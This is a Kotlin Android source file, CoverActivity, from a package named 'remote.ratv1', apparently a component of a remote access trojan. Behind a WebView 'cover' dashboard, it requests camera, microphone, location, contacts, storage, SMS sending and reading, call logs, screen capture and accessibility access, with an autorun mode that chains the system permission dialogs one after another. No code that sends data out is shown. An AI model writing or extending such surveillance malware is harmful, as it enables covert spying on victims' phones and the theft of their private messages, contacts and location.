package com.remote.ratv1

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.webkit.JavascriptInterface
import android.webkit.WebSettings
import android.webkit.WebView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.remote.ratv1.modules.DisplayHelper

class CoverActivity : AppCompatActivity() {

    private lateinit var wv: WebView
    private var autorunQueue: ArrayDeque<Pair<Int, Array<String>>>? = null

    companion object {
        private const val REQ_LOC       = 101
        private const val REQ_CAM       = 102
        private const val REQ_MIC       = 103
        private const val REQ_STOR      = 104
        private const val REQ_SCR       = 105
        private const val REQ_SMS       = 106
        private const val REQ_CONTACTS  = 107
        private const val REQ_CALL_LOG  = 108
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.statusBarColor = Color.parseColor("#0A0E27")
        window.navigationBarColor = Color.parseColor("#131836")

        wv = WebView(this).apply {
            setBackgroundColor(Color.parseColor("#0A0E27"))
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                cacheMode = WebSettings.LOAD_NO_CACHE
            }
            addJavascriptInterface(PermBridge(), "Android")
            loadUrl("file:///android_asset/dashboard.html")
        }
        setContentView(wv)

        // Reactive autorun: dialogs fire one-by-one, each triggered after the previous result.
        // No adb pm grant — actual system dialogs appear; test taps Allow on each.
        if (intent.getBooleanExtra("autorun", false)) {
            autorunQueue = ArrayDeque(listOf(
                REQ_CAM      to arrayOf(Manifest.permission.CAMERA),
                REQ_MIC      to arrayOf(Manifest.permission.RECORD_AUDIO),
                REQ_LOC      to arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
                REQ_CONTACTS to arrayOf(Manifest.permission.READ_CONTACTS),
                REQ_STOR     to arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                REQ_SMS      to arrayOf(Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS),
                REQ_CALL_LOG to arrayOf(Manifest.permission.READ_CALL_LOG),
            ))
            Handler(Looper.getMainLooper()).postDelayed({ fireNextAutorun() }, 500L)
        }
    }

    override fun onResume() {
        super.onResume()
        if (DisplayHelper.isReady()) {
            jsCallback(REQ_SCR, true)
        }
        if (AccessService.isAvailable()) {
            jsCallback(109, true) // acc step in wizard
        }
    }

    override fun onBackPressed() {
        if (wv.canGoBack()) wv.goBack() else super.onBackPressed()
    }

    // ─── reactive autorun: fire next dialog only after previous result received ───

    private fun fireNextAutorun() {
        val q = autorunQueue ?: return
        while (q.isNotEmpty()) {
            val (code, perms) = q.removeFirst()
            if (!isGranted(*perms)) {
                ActivityCompat.requestPermissions(this@CoverActivity, perms, code)
                return  // stop here; onRequestPermissionsResult fires next
            }
            jsCallback(code, true)  // already granted — notify JS and continue
        }
        // queue empty — all done
    }

    // ─── JS bridge ───────────────────────────────────────────────────────────────

    private fun isGranted(vararg perms: String) = perms.all {
        ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun jsCallback(code: Int, granted: Boolean) {
        wv.post { wv.evaluateJavascript("window.onPermResult($code,$granted)", null) }
    }

    inner class PermBridge {

        @JavascriptInterface
        fun requestCamera() = runOnUiThread {
            val p = arrayOf(Manifest.permission.CAMERA)
            if (isGranted(*p)) jsCallback(REQ_CAM, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_CAM)
        }

        @JavascriptInterface
        fun requestMic() = runOnUiThread {
            val p = arrayOf(Manifest.permission.RECORD_AUDIO)
            if (isGranted(*p)) jsCallback(REQ_MIC, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_MIC)
        }

        @JavascriptInterface
        fun requestLocation() = runOnUiThread {
            val p = arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION)
            if (isGranted(*p)) jsCallback(REQ_LOC, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_LOC)
        }

        @JavascriptInterface
        fun requestContacts() = runOnUiThread {
            val p = arrayOf(Manifest.permission.READ_CONTACTS)
            if (isGranted(*p)) jsCallback(REQ_CONTACTS, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_CONTACTS)
        }

        @JavascriptInterface
        fun requestStorage() = runOnUiThread {
            val p = arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE)
            if (isGranted(*p)) jsCallback(REQ_STOR, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_STOR)
        }

        @JavascriptInterface
        fun requestSMS() = runOnUiThread {
            val p = arrayOf(Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS)
            if (isGranted(*p)) jsCallback(REQ_SMS, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_SMS)
        }

        @JavascriptInterface
        fun requestCallLog() = runOnUiThread {
            val p = arrayOf(Manifest.permission.READ_CALL_LOG)
            if (isGranted(*p)) jsCallback(REQ_CALL_LOG, true)
            else ActivityCompat.requestPermissions(this@CoverActivity, p, REQ_CALL_LOG)
        }

        @JavascriptInterface
        fun requestAccessibility() = runOnUiThread {
            // Cannot grant programmatically — open Settings, user must enable
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        }

        @JavascriptInterface
        fun requestScreenCapture() = runOnUiThread {
            if (DisplayHelper.isReady()) {
                jsCallback(REQ_SCR, true)
            } else {
                startActivity(Intent(this@CoverActivity, GrantActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
            }
        }

        @JavascriptInterface
        fun checkPermission(perm: String): Boolean =
            ContextCompat.checkSelfPermission(this@CoverActivity, perm) == PackageManager.PERMISSION_GRANTED
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_SCR) {
            jsCallback(REQ_SCR, DisplayHelper.isReady())
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val granted = grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED
        jsCallback(requestCode, granted)
        // Reactive autorun: 800ms after this result, fire the next dialog in the queue
        if (autorunQueue != null) {
            Handler(Looper.getMainLooper()).postDelayed({ fireNextAutorun() }, 800L)
        }
    }
}
